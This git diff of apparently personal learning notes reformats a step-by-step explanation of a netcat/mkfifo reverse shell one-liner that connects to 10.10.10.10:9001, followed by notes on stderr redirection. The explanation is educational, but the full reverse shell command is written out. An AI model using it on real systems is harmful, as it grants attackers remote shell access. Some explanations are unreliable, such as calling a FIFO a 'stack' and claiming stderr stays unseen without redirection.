@@ -106,23 +106,23 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9001 >/tmp/f
 
 Here’s how it works:
 
-1. rm /tmp/f: Deletes the file named “f” in the “/tmp” directory if it exists.
-2. mkfifo /tmp/f: Creates a named pipe (FIFO) named “f” in the “/tmp” directory. This pipe acts as a stack for data between processes (First In First Out).
-3. cat /tmp/f: Reads from the named pipe “f.” It effectively listens for any data written into the pipe and sends any data it reads to the standard input (stdin) of the interactive shell.
-4. sh -i 2>&1: Starts an interactive shell (“sh”) and redirects stderr to the same location stdout is using. This location is not the named pipe “f” but is, in fact, standard output of the shell. The shell output (stdout/stderr) is sent to the standard input (stdin) of nc.
-5. nc 10.10.10.10 9001: Initiates a network connection to IP address 10.10.10.10 on port 9001.
-6. \>/tmp/f: Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f.”
+1. ```rm /tmp/f;``` Deletes the file named “f” in the “/tmp” directory if it exists.
+2. ```mkfifo /tmp/f;``` Creates a named pipe (FIFO) named “f” in the “/tmp” directory. This pipe acts as a stack for data between processes (First In First Out).
+3. ```cat /tmp/f|``` Reads from the named pipe “f.” It effectively listens for any data written into the pipe and sends any data it reads to the standard input (stdin) of the interactive shell.
+4. ```sh -i 2>&1|``` Starts an interactive shell (“sh”) and redirects stderr to the same location stdout is using. This location is not the named pipe “f” but is, in fact, standard output of the shell. The shell output (stdout/stderr) is sent to the standard input (stdin) of nc.
+5. ```nc 10.10.10.10 9001``` Initiates a network connection to IP address 10.10.10.10 on port 9001.
+6. ```>/tmp/f``` Redirects the standard output of the entire command (including the output from the interactive shell and the output from “nc”) to the named pipe “f.”
 
 In teh Linux:  
 • File descriptor 0 represents standard input (stdin).  
 • File descriptor 1 represents standard output (stdout).  
 • File descriptor 2 represents standard error (stderr).  
 
-So, when you use 2>&1, it’s instructing the shell to redirect standard error (file descriptor 2) to wherever standard output (file descriptor 1) is currently directed.  
+So, when you use ```2>&1```, it’s instructing the shell to redirect standard error (file descriptor 2) to wherever standard output (file descriptor 1) is currently directed.  
 
-The >& syntax is used for redirecting one file descriptor to the location another file descriptor is using.  
+The ```>&``` syntax is used for redirecting one file descriptor to the location another file descriptor is using.  
 
-When you run sh -i without any redirection, you will typically see the standard output (stdout) from the interactive shell session, but you won’t see standard error (stderr).  
+When you run ```sh -i``` without any redirection, you will typically see the standard output (stdout) from the interactive shell session, but you won’t see standard error (stderr).  
 
 Some commands return standard error (stderr) as output even when completed successfully, other commands actually return errors to standard error (stderr). wut?!  
 
